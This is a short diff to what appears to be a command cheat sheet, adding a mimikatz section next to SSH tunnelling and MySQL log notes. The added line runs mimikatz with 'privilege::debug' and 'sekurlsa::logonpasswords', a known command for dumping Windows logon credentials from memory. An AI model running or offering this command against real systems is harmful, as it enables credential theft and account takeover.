@@ -395,3 +395,8 @@ ssh -L 3336:db001.host:3306 user@pub001.host
 grep "A temporary password" /var/log/mysql.log | tail -1
 ```
 
+mimikatz
+
+```
+mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
